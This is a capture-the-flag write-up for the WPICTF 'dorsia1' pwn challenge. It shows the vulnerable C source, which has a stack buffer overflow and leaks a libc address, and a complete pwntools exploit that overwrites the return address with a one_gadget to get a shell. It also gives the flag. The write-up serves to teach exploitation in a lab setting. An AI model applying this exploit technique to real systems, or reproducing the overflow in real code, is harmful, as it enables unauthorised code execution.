# dorsia1 Writeup by Srdnlen  
## Category: PWN

## Description  
http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm The
first card.

nc dorsia1.wpictf.xyz 31337 or 31338 or 31339

made by: awg

Hint: Same libc as dorsia4, but you shouldn't need the file to solve.  
Hint2: 'A' * 77

## Source Code

```C  
#include <stdio.h>  
#include <stdlib.h>

void main() {  
   char a[69];  
   printf("%p\n",system+765772);  
   fgets(a,96,stdin);  
}  
```

## Writeup  
This looks like a very typical buffer overflow challenge... However, our
exploits just didn't work. Why?

The great minds at WPICTF decided to disable stack alignment for this
challenge. We were using 88 bytes of garbage, but actually it's 77, as the
second hint suggests. 69 + 8 for rbp.

Let's use `one_gadget` on the libc (from dorsia4) and it's done.

```  
from pwn import *

p = remote('dorsia1.wpictf.xyz', 31339)  
e = ELF('./libc.so.6')

# Leak addresses  
leak = int(p.recvline(), 16)  
system = leak - 765772  
libc = system - e.sym['__libc_system']  
one_gadget = libc + 0x4f322  
padding = b'A' * 77

# Info  
print('Libc: ', hex(libc))  
print('System: ', hex(system))

# Send the one_gadget and get flag ez  
p.sendline(padding + p64(one_gadget))  
p.interactive()  
```

## Flag  
`WPI{FEED_ME_A_STRAY_CAT}`  

Original writeup (https://github.com/srdnlen/ctf-
writeups/tree/master/wpictf20/dorsia1).